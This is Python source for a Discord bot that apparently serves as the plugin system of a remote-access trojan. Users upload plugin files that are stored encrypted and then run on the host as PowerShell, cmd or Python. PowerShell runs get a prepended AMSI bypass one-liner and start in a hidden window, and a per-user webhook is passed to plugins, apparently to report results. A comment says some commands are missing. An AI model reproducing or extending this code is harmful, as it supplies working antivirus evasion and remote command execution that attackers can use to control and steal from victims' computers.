import os
import json
import base64
import subprocess
import discord
from discord.ext import commands
from discord import app_commands
from cryptography.fernet import Fernet
import typing
# THERE ARE SOME MISSING COMMANDS !! A LOT OF STUFF WILL NOT WORK !!

PLUGIN_FOLDER = "plugins"
PLUGIN_PID_FILE = "plugin_pids.json"
PLUGIN_HOOKS_FILE = "plugin_hooks.json"
KEY_FILE = "plugin_key.key"
BOT_TOKEN="heheheheh"

os.makedirs(PLUGIN_FOLDER, exist_ok=True)

# Generate/load encryption key
if not os.path.exists(KEY_FILE):
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
        f.write(key)
else:
    with open(KEY_FILE, "rb") as f:
        key = f.read()
fernet = Fernet(key)

def load_json(path, default={}):
    if not os.path.exists(path):
        return default
    with open(path, "r", encoding="utf-8") as f:
        return json.load(f)

def save_json(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4)

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)


@bot.tree.command(name="plugin_import", description="📥 Import a .grataddin plugin file encrypted")
async def plugin_import(interaction: discord.Interaction, file: discord.Attachment):
    await interaction.response.defer()

    if not file.filename.endswith(".grataddin"):
        await interaction.followup.send("❌ Only `.grataddin` files are allowed.")
        return

    raw_content = await file.read()
    encrypted_content = fernet.encrypt(raw_content)

    plugin_path = os.path.join(PLUGIN_FOLDER, file.filename + ".enc")
    with open(plugin_path, "wb") as f:
        f.write(encrypted_content)

    lines = raw_content.decode(errors='ignore').splitlines()
    metadata = {}
    for line in lines:
        if line.strip().startswith("# plugin."):
            try:
                full_key, value = line[2:].split(":", 1)
                key = full_key.replace("plugin.", "").strip()
                metadata[key] = value.strip()
            except ValueError:
                continue


    required_keys = ["name", "description", "lang", "ositworkswith", "commands", "args"]
    missing_keys = [k for k in required_keys if k not in metadata]

    debug_message = "\n".join([f"{k}: {metadata.get(k, '(missing)')}" for k in required_keys])

    if missing_keys:
        await interaction.followup.send(f"❌ Invalid plugin file. Missing metadata keys: {', '.join(missing_keys)}\n\nParsed metadata:\n{debug_message}")
        return

    args_value = metadata["args"].strip().lower()
    args_struct = []
    if args_value not in ("none", ""):
        for arg in metadata["args"].split():
            if ":" not in arg:
                await interaction.followup.send(f"❌ Invalid argument format: `{arg}`. Use name:type.\n\nParsed metadata:\n{debug_message}")
                return
            name, arg_type = arg.split(":")
            args_struct.append({"name": name, "type": arg_type})

    metadata["args_parsed"] = args_struct

    meta_path = os.path.join(PLUGIN_FOLDER, metadata["name"] + ".json")
    with open(meta_path, "w", encoding="utf-8") as f:
        json.dump(metadata, f, indent=4)
    plugin_index = load_json("plugin_index.json", {})
    plugin_index[metadata["name"]] = {
        "enc_path": plugin_path,
        "meta_path": meta_path
    }
    save_json("plugin_index.json", plugin_index)

    embed = discord.Embed(
        title="✅ Plugin Imported",
        description="Plugin successfully imported and encrypted.",
        color=discord.Color.green()
    )
    for k in required_keys:
        embed.add_field(name=f"plugin.{k}", value=metadata.get(k, '(missing)'), inline=False)

    await interaction.followup.send(embed=embed)


@bot.tree.command(name="plugin_use", description="⚙️ Execute an encrypted plugin in-memory")
@app_commands.describe(name="Plugin name", args="Arguments in key=value format separated by space")
async def plugin_use(interaction: discord.Interaction, name: str, args: typing.Optional[str] = ""):
    await interaction.response.defer()

    plugin_index = load_json("plugin_index.json", {})
    if name not in plugin_index:
        await interaction.followup.send("❌ Plugin not found.")
        return

    enc_path = plugin_index[name]["enc_path"]
    meta_path = plugin_index[name]["meta_path"]


    if not os.path.exists(enc_path) or not os.path.exists(meta_path):
        await interaction.followup.send("❌ Plugin not found.")
        return

    with open(meta_path, "r", encoding="utf-8") as f:
        metadata = json.load(f)
    expected_args = metadata.get("args_parsed", [])
    user_args = dict(arg.split("=", 1) for arg in args.split() if "=" in arg)


    for arg in expected_args:
        if arg["name"] not in user_args:
            await interaction.followup.send(f"❌ Missing required arg: `{arg['name']}`")
            return

    lang = metadata["lang"].lower()
    env = os.environ.copy()
    webhook = load_json(PLUGIN_HOOKS_FILE).get(str(interaction.user.id))
    if webhook:
        env["GRA_T_PLUGIN_WEBHOOK"] = webhook
    cli_args = [user_args[arg["name"]] for arg in expected_args]

    decrypted = fernet.decrypt(open(enc_path, "rb").read()).decode(errors='ignore')
    plugin_lines = [line for line in decrypted.splitlines() if not line.startswith("# plugin.")]

    try:
        if lang == "powershell":
            amsi_bypass = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);"
            script = amsi_bypass + "\n" + "\n".join(plugin_lines)
            cmd = ["powershell", "-nop", "-noni", "-w", "hidden", "-Command", script] + cli_args

        elif lang in ["cmd", "batch"]:
            cmd_str = " & ".join(plugin_lines + list(cli_args))
            cmd = ["cmd", "/c", cmd_str]

        elif lang == "python":
            cmd_str = "\n".join(plugin_lines + list(cli_args))
            cmd = ["python", "-c", cmd_str]

        else:
            await interaction.followup.send(f"❌ Unsupported plugin language: `{lang}`")
            return

        process = subprocess.Popen(cmd, env=env)
        pids = load_json(PLUGIN_PID_FILE)
        pids[name] = process.pid
        save_json(PLUGIN_PID_FILE, pids)
        await interaction.followup.send(f"✅ Plugin `{name}` running in-memory (PID {process.pid})")

    except Exception as e:
        await interaction.followup.send(f"❌ Failed to run plugin: {str(e)}")


@bot.event
async def on_ready():
    try:
        synced = await bot.tree.sync()
        print(f"[+] Synced {len(synced)} command(s). Bot ready as {bot.user}")
    except Exception as e:
        print(f"[!] Failed to sync commands: {e}")

bot.run(BOT_TOKEN)
